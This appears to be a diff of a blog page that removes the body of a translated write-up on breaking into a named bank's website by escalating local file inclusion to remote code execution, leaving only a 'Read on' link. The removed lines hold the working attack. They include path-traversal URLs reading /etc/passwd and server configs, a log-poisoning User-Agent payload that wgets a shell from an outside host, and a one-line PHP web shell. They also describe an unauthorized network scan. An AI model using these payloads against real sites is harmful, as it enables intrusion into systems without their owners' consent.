@@ -114,81 +114,12 @@ Source: http://habrahabr.ru/post/143548/ One friend of mine was hired in a bank 
 
 <p><img src="/images/2012-05-30/000.png"></p>
 
-<p>3 parameters were vulnerable:  linksdop, pointermainmenu, pointer:
-*   <a href="http://www.kubunibank.ru/index.php?pointermainmenu=../../../../../../../../../etc/passwd">www.kubunibank.ru/index.php?pointermainmenu=../../../../../../../../../etc/passwd</a>
-*   <a href="http://www.kubunibank.ru/index.php?linksdop=../../../../../../../../../etc/hosts">www.kubunibank.ru/index.php?linksdop=../../../../../../../../../etc/hosts</a>
-*   <a href="http://www.kubunibank.ru/index.php?pointer=../../../../../../../../../etc/group">www.kubunibank.ru/index.php?pointer=../../../../../../../../../etc/group</a>
-The vulnerability is in this code, allowing to manipulate the name of included file.</p>
-
-<div><script src='https://gist.github.com/2814756.js?file='></script>
-<noscript><pre><code>&lt;?php
-$file = $_GET['pointer'];
-if(isset($file))
-{
-include($file);
-}
-else
-{
-include(&quot;index.php&quot;);
-}
-?&gt;
-</code></pre></noscript></div>
-
-
-<p>The most logical thing was to check it for RFI (Remote File Inclusion) – enter shell URL pointer as a parameter, e.g.:</p>
-
-<p><a href="http://www.kubunibank.ru/index.php?pointer=http://0x90.ru/shell.php">http://www.kubunibank.ru/index.php?pointer=http://0x90.ru/shell.php</a></p>
-
-<p>All PHP code in shell.php will be executed in this case. But it is forbidden to use URL as include parameter due to allow_url_include=0 in php.ini.</p>
-
-<p><img src="/images/2012-05-30/001.png"></p>
-
-<p>So we can’t move right to code execution.
-All we can do is to mess around with local files. We can browse the users in /etc/passwd or find out the server Linux version. Insert /../../../../../../../../../etc/gentoo-release and we can see that server works under Gentoo Linux. However reading of files doesn’t give us execute rights. Time to move forward for this. Let’s check /proc/self/environ.</p>
-
-<p><a href="http://www.kubunibank.ru/index.php?pointer=../../../../../../../../../../proc/self/environ">www.kubunibank.ru/index.php?pointer=../../../../../../../../../../proc/self/environ</a></p>
-
-<p><img src="/images/2012-05-30/002.png"></p>
-
-<p>Unfortunately we can’t change the environment variable since lighttpd is used and not apache. It is reasonable to check lighttpd web-server config file. We enter <a href="http://www.kubunibank.ru/index.php?pointer=../../../../../../../../../etc/lighttpd/lighttpd.conf">www.kubunibank.ru/index.php?pointer=../../../../../../../../../etc/lighttpd/lighttpd.conf</a>
-for that. The main goal of checking the config file is to define where web-server log files are located. As we can see, log is located in /var/log/lighttpd/access_kubunibank.log.</p>
-
-<p><img src="/images/2012-05-30/003.png"></p>
-
-<p>This makes the entire thing interesting, since we can impact the log file content. We can use FireFox plugin to execute a PHP code by entering following value in User-Agent in any website request</p>
-
-<div><script src='https://gist.github.com/2814799.js?file='></script>
-<noscript><pre><code>&lt;?php system(`wget 0x90.ru/shell.txt -O shell.php`)?&gt;</code></pre></noscript></div>
-
-
-<p><img src="/images/2012-05-30/004.png"></p>
-
-<p>Please note that we use ` quotations, since server declines « and &#8216;. Web-server will write our request to log file, and we are now one step away from the code execution. We have to use the following link to execute a code.</p>
-
-<p><a href="http://www.kubunibank.ru/index.php?pointer=../../../../../../../../../../var/log/lighttpd/access_kubunibank.log">www.kubunibank.ru/index.php?pointer=../../../../../../../../../../var/log/lighttpd/access_kubunibank.log</a></p>
-
-<p><img src="/images/2012-05-30/005.png"></p>
-
-<p>All PHP code from log file will be executed and now we have shell at <a href="http://www.kubunibank.ru/shell.php">www.kubunibank.ru/shell.php</a>
-Since I didn’t have any malicious intents, very simple shell was uploaded</p>
-
-<div><script src='https://gist.github.com/2814821.js?file='></script>
-<noscript><pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre></noscript></div>
-
-
-<p>Shell is uploaded, so we can leave some note for a system administrator.</p>
-
-<p><img src="/images/2012-05-30/006.png"></p>
-
-<p>I’ve found that nmap was also there, so I’ve scanned the local network just for fun.</p>
-
-<p><img src="/images/2012-05-30/007.png"></p>
-
-<p>I’d like to note, that the bank declined the audit proposal and vulnerability was fixed before release of this article.</p>
-
-<p>The most interesting point of this example is that logs can be executable also.</p>
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/blog/2012/05/30/breaking-the-bank-website-or-from-lfi-to-rce/">Read on &rarr;</a>
+    </footer>
   
 
 
